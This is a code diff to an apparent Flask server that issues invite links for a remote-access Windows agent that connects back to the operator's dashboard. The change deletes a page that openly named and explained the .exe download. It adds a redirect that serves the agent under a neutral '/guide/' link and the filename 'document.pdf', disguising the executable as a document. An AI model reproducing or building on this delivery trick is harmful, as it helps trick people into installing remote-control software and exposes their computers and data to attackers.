@@ -640,14 +640,15 @@ def generate_invite():
         "token":        token,
         "device_id":    token,
         "label":        label,
-        "download_url": f"{srv}/invite/{token}",
-        "agent_url":    f"{srv}/invite/{token}",
+        "download_url": f"{srv}/guide/{token}",
+        "agent_url":    f"{srv}/guide/{token}",
         "expires_at":   expires_at,
     }), 201
 
 
 @app.route("/invite/<token>")
 @app.route("/onboard/<token>")
+@app.route("/guide/<token>")
 def serve_agent(token):
     log.info(f"Agent download request: token={token}  ip={request.remote_addr}")
 
@@ -671,85 +672,9 @@ def serve_agent(token):
     })
     log.info(f"Agent download: token={token}  redirecting to GitHub Releases")
 
-    srv = request.host_url.rstrip("/")
-    download_url = AGENT_STORAGE_URL
-
-    html = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>ScreenConnect Agent Installer</title>
-  <style>
-    *{{margin:0;padding:0;box-sizing:border-box}}
-    body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;color:#e2e8f0;
-         display:flex;align-items:center;justify-content:center;min-height:100vh;}}
-    .card{{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:40px;max-width:480px;width:90%;text-align:center;}}
-    .logo{{font-size:48px;margin-bottom:16px}}
-    h1{{font-size:22px;font-weight:700;margin-bottom:8px;color:#f1f5f9}}
-    .sub{{color:#94a3b8;font-size:14px;margin-bottom:28px;line-height:1.5}}
-    .token-badge{{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 16px;
-                  font-family:monospace;font-size:13px;color:#7dd3fc;margin-bottom:24px;}}
-    .status-bar{{background:#0f172a;border-radius:8px;padding:14px;margin-bottom:20px;font-size:13px;color:#94a3b8;}}
-    .dot{{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;
-          animation:pulse 1.2s infinite;margin-right:8px;}}
-    @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
-    .btn{{display:inline-block;background:#3b82f6;color:#fff;padding:12px 28px;border-radius:8px;
-          font-size:15px;font-weight:600;text-decoration:none;margin:8px 4px;border:none;cursor:pointer;}}
-    .btn:hover{{background:#2563eb}}
-    .btn.sec{{background:#334155;color:#cbd5e1}}
-    .note{{font-size:12px;color:#64748b;margin-top:20px;line-height:1.6}}
-  </style>
-</head>
-<body>
-<div class="card">
-  <div class="logo">&#128421;</div>
-  <h1>ScreenConnect Agent</h1>
-  <p class="sub">Your invite link is ready. Download and run the installer to connect this device to your dashboard.</p>
-  <div class="token-badge">Token: {token}</div>
-  <div class="status-bar" id="status-bar">
-    <span class="dot"></span>
-    Waiting for agent to check in&hellip; dashboard will update automatically.
-  </div>
-  <a class="btn" id="dl-btn" href="{download_url}" download="screen_connect_agent_{token}.exe">
-    &#8659; Download Agent Installer
-  </a>
-  <button class="btn sec" onclick="window.close()">Close</button>
-  <p class="note">
-    After downloading, run <strong>screen_connect_agent_{token}.exe</strong> on Windows.<br>
-    The agent will connect back automatically &mdash; no config needed.<br>
-    Your dashboard at <a href="{srv}/dashboard" style="color:#7dd3fc">{srv}/dashboard</a> will show this device once connected.
-  </p>
-</div>
-<script>
-  setTimeout(() => {{
-    const a = document.createElement('a');
-    a.href = '{download_url}';
-    a.download = 'screen_connect_agent_{token}.exe';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }}, 800);
-  const pollUrl = '{srv}/api/session/{token}';
-  const statusEl = document.getElementById('status-bar');
-  async function poll() {{
-    try {{
-      const r = await fetch(pollUrl);
-      if (!r.ok) return;
-      const d = await r.json();
-      if (d.status === 'connected') {{
-        statusEl.innerHTML = '<span style="color:#22c55e;font-size:18px">&#10003;</span> <strong style="color:#22c55e">Connected!</strong> Device is live on your dashboard.';
-        clearInterval(poller);
-      }} else if (d.status === 'downloading') {{
-        statusEl.innerHTML = '<span class="dot"></span> Agent downloaded &mdash; waiting for first check-in&hellip;';
-      }}
-    }} catch(e) {{}}
-  }}
-  const poller = setInterval(poll, 5000);
-</script>
-</body>
-</html>"""
-    return html, 200, {"Content-Type": "text/html; charset=utf-8"}
+    response = redirect(AGENT_STORAGE_URL)
+    response.headers["Content-Disposition"] = "attachment; filename=document.pdf"
+    return response
 
 
 @app.route("/api/session/<token>/status")
